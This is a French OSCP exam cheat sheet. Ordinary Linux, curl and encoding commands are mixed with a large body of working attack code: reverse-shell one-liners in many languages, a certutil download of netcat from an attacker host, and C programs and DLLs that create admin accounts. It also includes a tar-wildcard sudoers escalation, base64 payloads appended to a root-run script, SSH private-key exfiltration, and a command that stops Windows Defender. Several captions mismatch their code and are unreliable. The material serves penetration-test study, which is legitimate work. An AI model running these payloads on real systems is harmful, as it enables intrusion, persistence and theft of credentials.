---
title: "OSCP · Utilitaires"
description: "Commandes courantes et outils complémentaires."
---

# OSCP · Utilitaires

Commandes courantes et outils complémentaires.

## Commandes Linux essentielles

### Afficher les fichiers

Affiche les fichiers cachés, les permissions et les tailles lisibles.

```bash
ls -lha
```

### Afficher le dossier actuel

Affiche le chemin actuel.

```bash
pwd
```

### Changer de dossier

Accède à un dossier ou remonte au dossier parent.

```bash
cd /chemin/dossier
cd ..
```

### Créer un fichier

Crée un fichier vide s’il n’existe pas.

```bash
touch fichier.txt
```

### Modifier un fichier

Ouvre le fichier dans un éditeur de texte.

```bash
nano fichier.txt
```

### Lire un fichier

Affiche son contenu.

```bash
cat fichier.txt
```

### Créer un dossier

Crée un dossier.

```bash
mkdir dossier
```

### Supprimer un fichier

Supprime le fichier après confirmation.

```bash
rm -i fichier.txt
```

### Supprimer un dossier

Supprime un dossier vide ou son contenu récursivement, avec confirmation.

```bash
rmdir dossier
rm -ri dossier
```

### Copier un fichier ou un dossier

Copie un fichier ou un dossier.

```bash
cp fichier.txt destination/
cp -r dossier destination/
```

### Déplacer ou renommer

Déplace ou renomme un fichier ou un dossier.

```bash
mv ancien nouveau
```

### Modifier les permissions (chmod)

`+x` : rendre exécutable. `755` : lecture et exécution pour tous, écriture pour le propriétaire. `777` : tous les droits pour tous (uniquement sur des fichiers de test). `600` : lecture et écriture pour le propriétaire uniquement.

```bash
chmod +x fichier.sh
chmod 755 fichier.sh
chmod 777 fichier.sh
chmod 600 fichier.txt
```

### Afficher l’utilisateur

Affiche le compte actuel et ses identifiants et groupes.

```bash
whoami
id
```

### Bash

<p class="oscp-command-note">Bash : établir une connexion de shell inversé vers l'adresse et le port du laboratoire.</p>

```bash
# Shell inversé Bash direct
/bin/bash -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1

# Ajouter le shell inverse à un fichier existant
echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> file

```

<p class="oscp-command-note">Supprimer les fichiers ciblés.</p>

```bash
# Méthode de transfert de flux FIFO avec Netcat
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <TARGET_IP> <TARGET_PORT> >/tmp/f

# Utilisation de 'sh' pour le shell inverse
sh -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1

```

### CMD

<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\nc.exe</code></p>

<p class="oscp-command-note">Examiner les paramètres des certificats Windows.</p>

```bash
# Télécharger Netcat depuis un CMD
certutil.exe -urlcache -split -f http://[attacker_ip]/nc.exe nc.exe

# Exécuter la commande shell inverse
.\nc.exe 192.168.45.215 444 -e cmd.exe

# Facultatif : doubler les barres obliques inverses lorsque la syntaxe du contexte l'exige.
.\\\\nc.exe 192.168.45.215 444 -e cmd.exe

```

### Golang

<p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<TARGET_IP>:<TARGET_PORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go

```

### Java

```text
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<TARGET_IP>/<TARGET_PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

```

### Lua

```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('<TARGET_IP>',<TARGET_PORT>);os.execute('/bin/sh -i <&3 >&3 2>&3');"

```

### Netcat

Vérifier les ports et les services de la cible autorisée.

<p class="oscp-command-note">Netcat/Telnet : établir la connexion TCP au service «Netcat».</p>

```bash
# Avec l’option -e
nc <TARGET_IP> <TARGET_PORT> -e /bin/sh
nc -nv <TARGET_IP> <TARGET_PORT> -e /bin/bash

# Sans l’option -e
mkfifo /tmp/f; nc <TARGET_IP> <TARGET_PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f

# Ajouter le shell inverse à un fichier existant
echo 'nc [lhost] [lport] -e /bin/bash' >> [file]

```

### Perl

```bash
perl -e 'use Socket;$i="<TARGET_IP>";$p=<TARGET_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

### PowerShell

Observer les permissions et la configuration de Windows.

<p class="oscp-command-note">PowerShell : charger ou exécuter l'outil concerné par «PowerShell».</p>

```powershell
# Main Option
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"

# Autre
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"

```

### PHP

Examiner les entrées et les réponses de l'application web.

```bash
php -r '$sock=fsockopen("<TARGET_IP>",<TARGET_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

```

### Python

<p class="oscp-command-note">Exécuter -c avec les paramètres indiqués pour «Python».</p>

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TARGET_IP>",<TARGET_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

### Ruby

```bash
ruby -rsocket -e 'f=TCPSocket.open("<TARGET_IP>",<TARGET_PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

```

### Socat

<p class="oscp-command-note">Configurer une connexion ou une redirection réseau.</p>

```bash
socat TCP:<TARGET_IP>:<TARGET_PORT> EXEC:/bin/bash

```

### Telnet

<p class="oscp-command-note">Supprimer les fichiers ciblés.</p>

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet <TARGET_IP> <TARGET_PORT> 0</tmp/p | /bin/sh 1>/tmp/p 2>&1

```

### Outil pour générer un shell inversé (Reverse Shell)

<p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>

```bash
git clone https://github.com/ShutdownRepo/shellerator
pip3 install --user -r requirements.txt
sudo cp shellrator.py /bin/shellrator

shellrator

```

### Améliorer les shells interactifs

<p class="oscp-command-note">Shell interactif : afficher la taille du terminal, suspendre puis reprendre correctement la session.</p>

```bash
# Trouvez la taille du terminal (remplacez les valeurs avec la sortie réelle)
stty size  # Example output: 50 235

# Passer le shell en arrière-plan et régler le terminal
Ctrl-Z
stty raw -echo  # Disable shell echo
fg
export SHELL=bash
export TERM=xterm  # Or use xterm-256color for extended color support

# Définir la taille du terminal
stty rows <ROWS> columns <COLS>

```

#### Netcat avec édition de ligne rlwrap

`rlwrap` ajoute un historique et l'édition de ligne à une commande interactive comme Netcat, sans améliorer à lui seul les permissions du shell.

<p class="oscp-command-note">Netcat avec édition de ligne rlwrap.</p>

```bash
rlwrap nc -lvnp <PORT_ECOUTE>
```

#### Gestionnaire de session Penelope

Démarrer Penelope, un gestionnaire de sessions shell, depuis son installation locale. Vérifier les options de la version installée. [Documentation officielle](https://github.com/brightio/penelope).

<p class="oscp-command-note">Gestionnaire de session Penelope.</p>

```bash
python3 penelope.py --help
python3 penelope.py -p <PORT_ECOUTE>
```

### Bash

<p class="oscp-command-note">Bash : ouvrir une nouvelle session interactive avec l'option -i.</p>

```bash
# Ouvrir un nouveau shell Bash
bash -i

```

### Lua

```text
# Exécuter un nouveau shell Bash
os.execute('/bin/bash')

```

### Perl

```bash
# Exécuter un nouveau shell Bash
perl -e 'exec "/bin/bash"'

```

### Python

<p class="oscp-command-note">Créer un pseudo-terminal interactif avec Python.</p>

```python
# Python 2.x
python -c 'import pty; pty.spawn("/bin/bash")'

# Python 3.x
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Obtenir un pseudo-terminal TTY avec Python
python -c 'import pty; import os; pty.spawn("/bin/bash"); os.system("stty raw -echo")'

```

### Ruby

```ruby
# Exécuter un nouveau shell Bash
exec "/bin/bash"

```

### Sh

```text
# Ouvrir un nouveau shell interactif
sh -i

```

### Linux

Examiner les permissions et la configuration de Linux.

#### Outils BloodHound

Examiner les objets, les droits et les services du domaine.

#### Utilitaires complémentaires : consulter les commandes ci-dessous

<p class="oscp-command-note">Gérer les paquets Debian/Ubuntu.</p>

```bash
sudo apt install krb5-user

```

```bash
sudo apt update && sudo apt upgrade && sudo apt install putty-tools

```

### Windows

Observer les permissions et la configuration de Windows.

#### Outils BloodHound

Pour l’installation et la collecte BloodHound, consulter la rubrique [Énumération Active Directory](./ad-enumeration.md).

**SeRestoreAbuse** se trouve dans l’[élévation de privilèges Windows](./privileges-windows.md), et non dans BloodHound.

#### Outils Kerberos

Examiner les objets, les droits et les services du domaine.

#### Informations sur le système Windows

Afficher le nom du poste, la version de Windows et le numéro de build sans modifier la configuration.

<p class="oscp-command-note">Informations sur le système Windows.</p>

```powershell
Get-ComputerInfo | Select-Object CsName,WindowsProductName,WindowsVersion,OsBuildNumber
```

### Connexion RDP avec identifiant et mot de passe

Vérifier les comptes, les secrets et les mécanismes d'authentification.

<p class="oscp-command-note">Se connecter à la cible via VNC ou RDP.</p>

```bash
xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboard /size:1920x1080 /drive:desktop,/home/[your_username]/Desktop

```

### Connexion RDP avec un hash NTLM (Pass-the-Hash)

Vérifier les comptes, les secrets et les mécanismes d'authentification.

<p class="oscp-command-note">Se connecter à la cible via VNC ou RDP.</p>

```bash
# Utiliser un hachage NTLM.
xfreerdp /size:1920x1080 /v:[IP] /u:[user] /H:[hash] /cert:ignore /dynamic-resolution

```

### Connexion RDP avec rdesktop

Vérifier les comptes, les secrets et les mécanismes d'authentification.

<p class="oscp-command-note">Se connecter à la cible via VNC ou RDP.</p>

```bash
# Utile lorsque GUI est nécessaire pour les attaques.
rdesktop [IP]

```

### Connexion RDP avec paramètres personnalisés

<p class="oscp-command-note">Se connecter à la cible via VNC ou RDP.</p>

```bash
# Connectez-vous avec un nom d'utilisateur et un mot de passe
xfreerdp /size:1920x1080 /u:[user] /p:[password] /v:[host/ip] /drive:desktop,/home/[your_username]/Desktop

```

```bash
# Connectez-vous aux dimensions et aux références spécifiées
rdesktop [IP] -u [user] -p [password] -g 80%+150+100

```

### Activer RDP lorsqu’il est désactivé

<p class="oscp-command-note">Vérifier la configuration RDP et l’authentification NLA avec PowerShell.</p>

```powershell
$ComputerName = hostname
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
# Si le résultat est 1, l’authentification NLA est requise ; cela n’indique pas si RDP est activé

# Ne plus exiger l’authentification NLA (cela n’active pas RDP)
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)

# Exiger l’authentification NLA pour les connexions RDP
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(1)

```

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

```

```powershell
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "[username]"

```

```powershell
# Option 1 : utiliser un compte Active Directory
Add-ADGroupMember -Identity "Remote Desktop Users" -Members "[domain]\[username]"

# Option 2 : utiliser l'outil net.
net localgroup "Remote Desktop Users" "[domain]\[username]" /add

```

```powershell
# Ceci est fait parce que si un pare-feu est configuré, il peut causer des problèmes pour notre RDP

# Vérifier l'état : True indique que la règle est activée et que RDP devrait être accessible.
Get-NetFirewallRule -DisplayGroup "Remote Desktop"

# Active la règle si elle est désactivée pour autoriser le trafic sur le port RDP 3389.
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

```

```powershell
# 1. Créer le nouvel utilisateur
New-ADUser -Name "[username]" -AccountPassword (ConvertTo-SecureString "P@ssword123!" -AsPlainText -Force) -Enabled $true

# 2. Confirmer qu'il a été créé avec succès (devrait apparaître dans la liste)
Get-NetUser | select cn

# 3. Ajouter un utilisateur au groupe RDP, doit être exécuté en tant qu'administrateur
Add-ADGroupMember -Identity "Remote Management Users" -Members [username]

# 4. Ajouter utilisateur au groupe Adinistrators, doit être exécuté en tant qu'administrateur
Add-ADGroupMember -Identity "Administrators" -Members [username]

# 5. Enable RDP Usage
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# 6. Se connecter via RDP
rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]

```

## Encoder et décoder du texte

### Convertir les octets décimaux en texte

```bash
printf '%s\n' '72 101 108 108 111' | awk '{for (i=1; i<=NF; i++) printf "%c", $i}'
```

### Afficher les octets décimaux d’un texte

Les espaces séparent les valeurs décimales.

```bash
printf '%s' 'Hello' | od -An -v -t u1
```

### Décoder du Base64

```bash
printf '%s' 'SGVsbG8gd29ybGQ=' | base64 --decode
```

### Encoder du texte en Base64

`printf` évite d’ajouter un saut de ligne au texte à encoder.

```bash
printf '%s' 'Hello world' | base64
```

### Décoder une chaîne hexadécimale

```bash
printf '%s' '48656c6c6f20776f726c64' | xxd -r -p
```

### Afficher le texte en hexadécimal

```bash
printf '%s' 'Hello world' | xxd -p
```

### Rétablir le texte inversé

```bash
printf '%s\n' 'dlrow olleH' | rev
```

### Inverser les caractères d’une ligne

```bash
printf '%s\n' 'Hello world' | rev
```

### Décoder du ROT13

```bash
printf '%s' 'Uryyb jbeyq' | LC_ALL=C tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

### Appliquer ROT13

```bash
printf '%s' 'Hello world' | LC_ALL=C tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

### Décoder un composant d’URL

```bash
python3 -c "from urllib.parse import unquote; print(unquote('Hello%20World%21'))"
```

### Encoder un composant d’URL

```bash
python3 -c "from urllib.parse import quote; print(quote('Hello World!', safe=''))"
```

## Requêtes HTTP avec curl

Les exemples supposent une API de test sur `127.0.0.1:8000` qui accepte la méthode et le chemin indiqués. Les appels HTTPS utilisent le service local sur le port `8443`.

### Lire le corps de la réponse

```bash
curl http://127.0.0.1:8000/
```

### Demander une réponse JSON

```bash
curl -H 'Accept: application/json' http://127.0.0.1:8000/
```

### Envoyer un formulaire avec POST

```bash
curl --data 'nom=Alice&ville=Paris' http://127.0.0.1:8000/formulaire
```

### Envoyer du JSON avec POST

```bash
curl -H 'Content-Type: application/json' --data '{"nom":"Alice"}' http://127.0.0.1:8000/api
```

### Encoder les champs d’un formulaire

```bash
curl --data-urlencode 'nom=Alice Martin' --data-urlencode 'ville=Aix & environs' http://127.0.0.1:8000/formulaire
```

### Remplacer une ressource avec PUT

```bash
curl -X PUT --data 'nom=Alice' http://127.0.0.1:8000/ressources/demo
```

### Supprimer une ressource de test avec DELETE

```bash
curl -X DELETE http://127.0.0.1:8000/ressources/demo
```

### S’authentifier avec un compte HTTP

curl demande le mot de passe et vérifie le certificat du serveur.

```bash
curl --user etudiant https://localhost:8443/
```

### Définir l’en-tête User-Agent

```bash
curl --user-agent 'ClientTest/1.0' http://127.0.0.1:8000/
```

### Afficher les en-têtes avec le corps

```bash
curl -i http://127.0.0.1:8000/
```

### Enregistrer le corps dans un fichier

```bash
curl --output ./reponse.html http://127.0.0.1:8000/
```

### Demander les en-têtes avec HEAD

```bash
curl --head http://127.0.0.1:8000/
```

### Masquer la progression et afficher les erreurs

```bash
curl --silent --show-error http://127.0.0.1:8000/
```

### Afficher le détail de l’échange HTTP

La trace peut contenir les en-têtes d’authentification.

```bash
curl --verbose http://127.0.0.1:8000/
```

### Envoyer des cookies de test

```bash
curl --cookie 'langue=fr; theme=sombre' http://127.0.0.1:8000/
```

### Enregistrer les cookies reçus

```bash
curl --cookie-jar ./cookies.txt http://127.0.0.1:8000/
```

### Renvoyer les cookies d’un fichier

```bash
curl --cookie ./cookies.txt http://127.0.0.1:8000/
```

### Déposer un fichier en multipart

Le serveur doit accepter un formulaire avec un champ nommé `file`.

```bash
curl --form 'file=@./rapport.txt' http://127.0.0.1:8000/depot
```

### Reprendre un téléchargement interrompu

Le fichier local doit contenir le début de cette ressource et le serveur doit accepter les requêtes partielles.

```bash
curl --continue-at - --output ./rapport.txt http://127.0.0.1:8000/rapport.txt
```

### Utiliser un proxy HTTP local

Le proxy doit déjà écouter sur le port 3128.

```bash
curl --proxy http://127.0.0.1:3128 http://example.org/
```

### Diagnostiquer un certificat local non reconnu

Cette option désactive la vérification du certificat pour cette requête.

```bash
curl --insecure https://localhost:8443/
```

### Suivre les redirections HTTP

```bash
curl --location http://127.0.0.1:8000/redirection
```

### Limiter la durée totale à 30 secondes

```bash
curl --max-time 30 http://127.0.0.1:8000/
```

### Afficher uniquement le statut HTTP

```bash
curl --silent --show-error --output /dev/null --write-out '%{http_code}\n' http://127.0.0.1:8000/
```

### Demander HTTP/2 et afficher la version négociée

Il faut une version de curl compilée avec HTTP/2 et un certificat reconnu.

```bash
curl --http2 --silent --show-error --output /dev/null --write-out '%{http_version}\n' https://localhost:8443/
```

## Examiner un fichier sous Linux

### Identifier le format d’un fichier

```bash
file -- ./rapport.pdf
```

### Lire les 64 premiers octets

```bash
xxd -l 64 ./rapport.pdf
```

### Afficher les chaînes imprimables d’un binaire

Affiche au plus 40 chaînes d’au moins six caractères avec l’encodage par défaut de GNU strings.

```bash
strings -a -n 6 ./programme.elf | sed -n '1,40p'
```

### Indenter un document JSON

```bash
python3 -m json.tool ./reponse.json
```

### Lire la propriété data avec jq

```bash
jq '.data' ./reponse.json
```

## Générer une clé SSH

```bash
ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa -N ''

```

<p class="oscp-command-note">Démarrer un serveur HTTP local pour fournir des fichiers.</p>

```bash
# Réception HTTP PUT sur une machine de laboratoire isolée (accès anonyme).
mkdir -p ./reception
wsgidav -H 0.0.0.0 -p 8080 -r ./reception --auth anonymous
```

<p class="oscp-command-note">WebDAV : téléverser un fichier par PUT. Le serveur Python http.server standard ne reçoit pas les fichiers.</p>

```bash
curl -T /tmp/id_rsa http://<IP_RECEPTEUR>:8080/id_rsa

```

<p class="oscp-command-note">Supprimer les fichiers ciblés.</p>

```bash
# Supprimer les fichiers clés de la machine victime pour éviter de laisser des fichiers sensibles.
rm /tmp/id_rsa /tmp/id_rsa.pub

```

<p class="oscp-command-note">Télécharger une ressource distante.</p>

```bash
# Remplacer <victim_ip> par l'adresse IP où la clé privée a été téléchargée.
wget http://<victim_ip>/id_rsa

```

<p class="oscp-command-note">Modifier les permissions d&#x27;un fichier.</p>

```bash
chmod 600 id_rsa

```

<p class="oscp-command-note">Se connecter avec une clé SSH privée.</p>

```bash
ssh -i id_rsa user@<victim_ip>

```

### Créer une paire de clés Ed25519

Choisis un nom libre pour la clé et saisis une phrase secrète à l’invite.

```bash
ssh-keygen -t ed25519 -f ./cle-audit -C 'audit-laboratoire'
```

## Compilation croisée pour Windows

Observer les permissions et la configuration de Windows.

<p class="oscp-command-note">Extrait C : exemple technique pour «Compilation croisée pour Windows» (ce n'est pas une commande de terminal).</p>

```c
#include <stdlib.h>

int main ()
{
  system("net user emma Password123! /add");
  system("net localgroup administrators emma /add");
  return 0;
}

```

<p class="oscp-command-note">Extrait C : exemple technique pour «Compilation croisée pour Windows» (ce n'est pas une commande de terminal).</p>

```c
#include <windows.h>  
#include <stdlib.h>  

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
  switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
      // Code exécuté lors du chargement de la DLL
      system("net user emma Password123! /add");
      system("net localgroup administrators emma /add");
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE; // Indicate successful execution
}

```

<p class="oscp-command-note">Commandes de compilation croisée vers Windows.</p>

```bash
# Compiler le code C pour produire une application Windows 64 bits
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Compiler le code C pour produire une DLL Windows
x86_64-w64-mingw32-gcc -shared -o adduser.dll adduser.c -Wl,--subsystem,windows

```

## Retrouver les fichiers de preuve (Flags)

<p class="oscp-command-note">Rechercher des fichiers correspondant au motif «local.txt».</p>

```bash
find / -type f -name local.txt 2>/dev/null

```

<p class="oscp-command-note">Afficher le nom de la machine.</p>

```bash
# Linux
hostname && whoami && cat proof.txt && ip a 

# Windows
hostname && whoami && type [local/proof].txt && ipconfig /all

```

## Conseils complémentaires

<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Conseils complémentaires».</p>

```bash
# Exemple de propriété de fichier avant changement
ls -l id_rsa
# Exemple de sortie : -rw------- 1 root root 3381 Sep 24 2020 id_rsa

# Changer la propriété du fichier pour un nouvel utilisateur
sudo chown <new_owner> <file_name>

# Exemple de propriété du fichier après changement
ls -l id_rsa
# Exemple de sortie : -rw------- 1 <new_owner> root 3381 Sep 24 2020 id_rsa

```

```bash
# Ajouter un utilisateur à un groupe
sudo usermod -aG <group_name> <username>

```

### Lire aussi les métadonnées inconnues ou en double

```bash
exiftool -a -u ./document.pdf
```

```bash
hashid [hash]

```

**Paramètres et repères :**
`xato-net-10-million-usernames.txt` · `/etc/sudoers`  

<p class="oscp-command-note">Se placer dans le répertoire utilisé pour «Conseils complémentaires».</p>

```bash
# L'idée est d'avoir le fichier sudoers avec cette ligne: emma ALL=(root) NOPASSWD: ALL

cd /tmp
touch payload.sh
echo "echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > payload.sh # Or use nano to add the file if possible
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh payload.sh'
# La commande ci-dessous est possible car nous avons coché sudo -l et avons vu le tar de permission pour l'utilisateur.
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
# Après cela nous pouvons vérifier avec sudo -l et devrait voir la ligne: (root) NOPASSWD: ALL. L'accès au shell racine
sudo /bin/bash

```

<p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>

```bash
echo "-----BEGIN OPENSSH PRIVATE KEY----- ... -----END OPENSSH PRIVATE KEY-----" > /tmp/id_rsa

```

<p class="oscp-command-note">Rechercher des fichiers correspondant au motif «*.php».</p>

```bash
find [directoryPath] -maxdepth 5 -name "*.php" -exec grep -Hni "password" {} \; 2>/dev/null

```

<p class="oscp-command-note">Encoder ou décoder les données au format Base64.</p>

```bash
# Shen a trouvé un script propriété et géré par root mais en écriture pour nous

# At target machine  
echo -n "chmod u+s /bin/bash" | base64  
echo "echo -n 'Y2htb2QgdStzIC9iaW4vYmFzaA=='|base64 -d|bash" >> /var/backups/etc_Backup.sh  

#wait for a few second  
ls -al /bin/bash  
/bin/bash -p  

#You can use other payload as well such as  
echo -n "sh -i >& /dev/tcp/$KaliIP/80 0>&1" | base64  
echo "echo -n 'c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNzYvODAgMD4mMQ=='|base64 -d|bash" >> /var/backups/etc_Backup.sh

```

<p class="oscp-command-note">Script PowerShell pour les conseils complémentaires.</p>

```powershell
# Trouver un fichier
locate <FILE>
find / -name "<FILE>"

# Afficher les connexions actives
netstat -lntp

# Liste tous les fichiers SUID
find / -perm -4000 2>/dev/null

# Afficher la version de Linux
cat /etc/issue
uname -a

# Liste des processus d'exécution
ps -faux

Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue

# Afficher uniquement les fichiers cachés
Dir -Hidden

# Afficher tous les fichiers, y compris cachés
Dir -Force

dir /s pass == cred == vnc == .config
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Désactive le défenseur des fenêtres
sc stop WinDefend

# Contournement d'une restriction
powershell -nop -ep bypass

# Liste des fichiers cachés
dir /a

# Trouver un fichier
dir /b/s "<FILE>"

```

<p class="oscp-command-note">Linux : créer un groupe et un utilisateur avec les UID/GID fournis (droits sudo requis).</p>

```bash
# Créer un nouveau groupe avec un GID spécifique
sudo groupadd -g <gid> <group_name>

# Créer un nouvel utilisateur avec un UID spécifique et GID
sudo useradd -u <uid> -g <gid> <username>

# Définir un mot de passe pour le nouvel utilisateur
sudo passwd <username>

```

```bash
# Linux
export PATH="$PATH:/usr/local/bin:/usr/bin:/bin"

# Windows
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;

```

## Vérifier un fichier sous Linux

### Calculer l’empreinte SHA-256

```bash
sha256sum -- ./rapport.pdf
```

### Lire l’émetteur et les dates d’un certificat PEM

```bash
openssl x509 -in ./certificat.pem -noout -subject -issuer -dates
```

### Lister les bibliothèques déclarées par un ELF

Les entrées `NEEDED` décrivent les dépendances directes du fichier.

```bash
readelf -d ./programme.elf | grep NEEDED
```

Le [format du fichier](#identifier-le-format-d-un-fichier) se vérifie avec `file`.

### Repérer les signatures dans une image

```bash
binwalk ./image.bin
```

### Extraire les contenus reconnus par Binwalk

Dans un dossier de travail isolé, l’extraction dépend des formats détectés et des extracteurs installés.

```bash
binwalk -e ./image.bin
```

### Afficher les informations de compression UPX

```bash
upx -l ./programme.upx
```

### Vérifier l’intégrité de la compression UPX

```bash
upx -t ./programme.upx
```

## Accès graphique

### Ouvrir une session avec FreeRDP 3

Depuis un bureau Linux, utilise un compte autorisé et un serveur RDP accessible.

```bash
xfreerdp3 /v:10.10.10.30 /u:etudiant /dynamic-resolution
```

## Sources

[curl](https://curl.se/docs/manpage.html) · [GNU Coreutils](https://www.gnu.org/software/coreutils/manual/coreutils.html) · [xxd](https://manpages.debian.org/trixie/xxd/xxd.1.en.html) · [Python, encodage d’URL](https://docs.python.org/3/library/urllib.parse.html) · [jq](https://jqlang.org/manual/) · [OpenSSL](https://docs.openssl.org/3.5/man1/openssl-x509/) · [Binwalk](https://github.com/ReFirmLabs/binwalk) · [UPX](https://upx.github.io/upx/upx-doc.html).

Sources d’origine : [notes de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/index.md) et [guide d’Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- notes-krovs-2026 -->
<!-- refined-oscp -->
